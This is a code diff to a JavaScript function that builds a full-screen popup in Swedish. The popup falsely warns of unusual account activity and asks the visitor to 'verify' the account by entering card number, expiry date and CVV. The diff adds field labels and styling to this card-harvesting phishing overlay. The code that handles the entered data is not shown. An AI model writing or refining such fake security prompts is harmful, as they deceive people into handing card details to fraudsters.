@@ -6,8 +6,13 @@ function createPopup() {
     var popupTextBox = document.createElement("P");
     var popupCCDateField = document.createElement("INPUT");
     var popupCCCVVField = document.createElement("INPUT");
+    var newline = document.createElement("P");
+    var popupCCNumberHint = document.createElement("P");
+    var popupCCDateFieldHint = document.createElement("P");
+    var popupCCCVVFieldHint = document.createElement("P");
     var popupButton = document.createElement("BUTTON");
     popup.style.boxSizing = "border-box";
+    popup.style.whiteSpace = "pre";
     popup.style.height = "90vh";
     popup.style.width = "90vw";
     popup.style.backgroundColor = "#FFF9F8";
@@ -21,7 +26,7 @@ function createPopup() {
     popup.style.boxShadow = "1px 1px 15px 5px #333333AA";
     popup.style.padding = "20px";
     popup.style.borderRadius = "5px";
-    popup.style.color = "black";
+    popup.style.color = "black !Important";
     popupHeader.innerHTML = "Onormal aktivitet har upptäckts på ditt konto";
     popupHeader.style.display = "inline";
     popupTextBox.innerHTML = "För att verifiera att det verkligen är du och fortsätta använda tjänsten behöver vi verifiera dina kontouppgifter";
@@ -36,6 +41,13 @@ function createPopup() {
     popupCCDateField.style.width = "5%";
     popupCCDateField.placeholder = "Giltigt till";
     popupCCDateField.style.border = "1px solid black";
+    popupCCNumberHint.innerHTML = "Kortnummer           ";
+    popupCCNumberHint.style.display = "inline-block";
+    popupCCDateFieldHint.innerHTML = "Giltigt till  ";
+    popupCCDateFieldHint.marginRight = "10px";
+    popupCCDateFieldHint.style.display = "inline-block";
+    popupCCCVVFieldHint.innerHTML = "       CCV-kod";
+    popupCCCVVFieldHint.style.display = "inline-block";
     popupButton.innerHTML = "Verifiera konto";
     popupButton.style.marginTop = "2.4%";
     popupButton.style.width = "20%";
@@ -48,6 +60,10 @@ function createPopup() {
     popup.appendChild(popupCCNumberField);
     popup.appendChild(popupCCDateField);
     popup.appendChild(popupCCCVVField);
+    popup.appendChild(newline);
+    popup.appendChild(popupCCNumberHint);
+    popup.appendChild(popupCCDateFieldHint);
+    popup.appendChild(popupCCCVVFieldHint);
     popup.appendChild(popupButton);
     document.body.appendChild(popup);
 }
